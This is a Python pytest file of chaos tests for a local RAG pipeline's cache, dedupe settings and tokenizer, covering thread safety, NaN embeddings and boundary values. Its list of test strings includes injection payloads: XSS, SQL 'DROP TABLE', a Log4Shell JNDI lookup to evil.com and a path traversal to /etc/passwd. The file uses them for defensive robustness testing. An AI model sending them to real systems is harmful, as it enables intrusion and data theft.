# -*- coding: utf-8 -*-
"""
test_rag_pipeline_monkey.py — RAG Pipeline Chaos / Monkey Tests
================================================================

Targets: zena_mode/rag_pipeline.py (SemanticCache, LocalRAG, DedupeConfig)
Feeds adversarial inputs, checks thread safety, boundary conditions.

Run:
    pytest tests/test_rag_pipeline_monkey.py -v --tb=short -x
"""

import os
import random
import string
import sys
import threading
import time
from pathlib import Path
from typing import Any, Dict, List
from unittest.mock import MagicMock, patch

import pytest

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

# ── Chaos generators (same pattern as test_gorilla_monkey.py) ────────────────

_CHAOS_STRINGS: list[str] = [
    "",
    "   ",
    "\n\n\n\t\t",
    "\x00\x01\x02\x03\x04\x05",
    "A" * 100_000,
    "🔥" * 5_000,
    "<script>alert('xss')</script>",
    "'; DROP TABLE users; --",
    "{{7*7}}",
    "${jndi:ldap://evil.com}",
    "../../../etc/passwd",
    "[[[[[[[[[[]]]]]]]]]]",
    "{{{{{{{{{{}}}}}}}}}}}",
    "Hello 你好 مرحبا こんにちは שלום Salut Hola 🎉",
    "\u202e\u200b\u200c\u200d\ufeff",
    "NaN",
    "null",
    "undefined",
    "None",
    "True",
    "False",
    "-1",
    "0",
    "9999999999999999999999999999999",
    "inf",
    "-inf",
    "1e308",
    "-0",
    "\r\n\r\n",
    "a\nb\nc\n" * 5_000,
]


def _random_text(n: int = 200) -> str:
    return "".join(random.choices(string.printable, k=n))


# ═════════════════════════════════════════════════════════════════════════════
#  SemanticCache Monkey Tests
# ═════════════════════════════════════════════════════════════════════════════


@pytest.mark.monkey
class TestSemanticCacheMonkey:
    """Abuse SemanticCache with adversarial queries and values."""

    def _make_cache(self, max_entries=50, ttl=60):
        from zena_mode.rag_pipeline import SemanticCache

        mock_model = MagicMock()
        mock_model.encode.return_value = [random.random() for _ in range(384)]
        return SemanticCache(model=mock_model, max_entries=max_entries, ttl=ttl)

    def test_chaos_strings_no_crash(self):
        """Feed every chaos string as a query — must not crash."""
        cache = self._make_cache()
        for s in _CHAOS_STRINGS:
            result = cache.get(s)
            assert result is None or isinstance(result, list)
            cache.set(s, [{"text": "answer", "score": 0.9}])

    def test_empty_results_roundtrip(self):
        cache = self._make_cache()
        cache.set("test query", [])
        # get may return None (empty list might not be cached) or []
        result = cache.get("test query")
        assert result is None or isinstance(result, list)

    def test_overflow_eviction(self):
        """Insert more than max_entries — must not OOM."""
        cache = self._make_cache(max_entries=10)
        for i in range(100):
            cache.set(f"query_{i}", [{"text": f"answer_{i}"}])
        # Should not have more than max_entries
        # (internal implementation may vary, just ensure no crash)

    def test_clear_idempotent(self):
        cache = self._make_cache()
        cache.set("q", [{"text": "a"}])
        cache.clear()
        cache.clear()  # double clear must not crash
        assert cache.get("q") is None

    def test_concurrent_get_set(self):
        """10 threads doing get/set simultaneously — no corruption."""
        cache = self._make_cache(max_entries=100)
        errors = []

        def worker(tid):
            try:
                for i in range(50):
                    cache.set(f"thread_{tid}_q_{i}", [{"text": f"ans_{i}"}])
                    cache.get(f"thread_{tid}_q_{random.randint(0, i)}")
            except Exception as e:
                errors.append(e)

        threads = [threading.Thread(target=worker, args=(t,)) for t in range(10)]
        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=30)

        assert not errors, f"Thread errors: {errors}"

    def test_nan_embedding_no_crash(self):
        """Model returns NaN embeddings — cache must handle gracefully."""
        from zena_mode.rag_pipeline import SemanticCache

        mock_model = MagicMock()
        mock_model.encode.return_value = [float("nan")] * 384
        cache = SemanticCache(model=mock_model, max_entries=50, ttl=60)
        cache.set("test", [{"text": "answer"}])
        result = cache.get("test")
        # May return None or the cached value — either is fine, just no crash


# ═════════════════════════════════════════════════════════════════════════════
#  DedupeConfig Monkey Tests
# ═════════════════════════════════════════════════════════════════════════════


@pytest.mark.monkey
class TestDedupeConfigMonkey:
    """Verify DedupeConfig defaults and boundary values."""

    def test_default_threshold_valid(self):
        from zena_mode.rag_pipeline import DedupeConfig

        cfg = DedupeConfig()
        assert 0.0 <= cfg.SIMILARITY_THRESHOLD <= 1.0

    def test_custom_threshold(self):
        from zena_mode.rag_pipeline import DedupeConfig

        cfg = DedupeConfig()
        cfg.SIMILARITY_THRESHOLD = 0.5
        assert cfg.SIMILARITY_THRESHOLD == 0.5


# ═════════════════════════════════════════════════════════════════════════════
#  LocalRAG Monkey Tests (with heavy mocking)
# ═════════════════════════════════════════════════════════════════════════════


@pytest.mark.monkey
class TestLocalRAGMonkey:
    """Test LocalRAG construction and early lifecycle with mocks."""

    def test_construction_no_crash(self):
        """LocalRAG() with default args should not crash on init."""
        import tempfile
        import numpy

        from zena_mode.rag_pipeline import LocalRAG

        # Mock heavy deps to avoid HuggingFace download and Qdrant storage
        mock_st = MagicMock()
        mock_st.return_value.encode.return_value = [[0.1] * 384]
        mock_st.return_value.get_sentence_embedding_dimension.return_value = 384
        mock_ce = MagicMock()
        mock_qc = MagicMock()

        with tempfile.TemporaryDirectory() as tmpdir:
            with patch("zena_mode.rag_pipeline.SentenceTransformer", mock_st), \
                 patch("zena_mode.rag_pipeline.CrossEncoder", mock_ce), \
                 patch("zena_mode.rag_pipeline.QdrantClient", mock_qc), \
                 patch("zena_mode.rag_pipeline.Distance", MagicMock()), \
                 patch("zena_mode.rag_pipeline.VectorParams", MagicMock()), \
                 patch("zena_mode.rag_pipeline.PointStruct", MagicMock()), \
                 patch("zena_mode.rag_pipeline.np", numpy):
                try:
                    rag = LocalRAG(cache_dir=Path(tmpdir))
                    assert rag is not None
                except (ConnectionError, OSError, RuntimeError):
                    pass  # expected without Qdrant running

    def test_close_without_init(self):
        """close() on a partially-initialized instance must not crash."""
        from zena_mode.rag_pipeline import LocalRAG

        rag = LocalRAG.__new__(LocalRAG)
        # Force partial state
        rag._client = None
        rag._collection_name = "test"
        try:
            rag.close()
        except Exception:
            pass  # any graceful handling is fine

    def test_tokenize_chaos(self):
        """_tokenize should handle all chaos strings."""
        from zena_mode.rag_pipeline import LocalRAG

        rag = LocalRAG.__new__(LocalRAG)
        for s in _CHAOS_STRINGS:
            try:
                tokens = rag._tokenize(s)
                assert isinstance(tokens, list)
            except (AttributeError, TypeError):
                pass  # _tokenize may need initialization


# ═════════════════════════════════════════════════════════════════════════════
#  Integration: Mock Pipeline Flow
# ═════════════════════════════════════════════════════════════════════════════


@pytest.mark.monkey
class TestPipelineIntegrationMonkey:
    """High-level pipeline safety checks with mocked dependencies."""

    def test_import_all_pipeline_components(self):
        """All components from rag_pipeline must be importable."""
        from zena_mode.rag_pipeline import DedupeConfig, LocalRAG, SemanticCache

        assert DedupeConfig is not None
        assert LocalRAG is not None
        assert SemanticCache is not None

    def test_semantic_cache_ttl_boundary(self):
        """Cache with 0 TTL = immediate expiry (or at least no crash)."""
        from zena_mode.rag_pipeline import SemanticCache

        mock_model = MagicMock()
        mock_model.encode.return_value = [0.1] * 384
        cache = SemanticCache(model=mock_model, max_entries=10, ttl=0)
        cache.set("q", [{"text": "a"}])
        # With TTL=0, get might return None (expired) — both None and data are valid
        result = cache.get("q")
        assert result is None or isinstance(result, list)
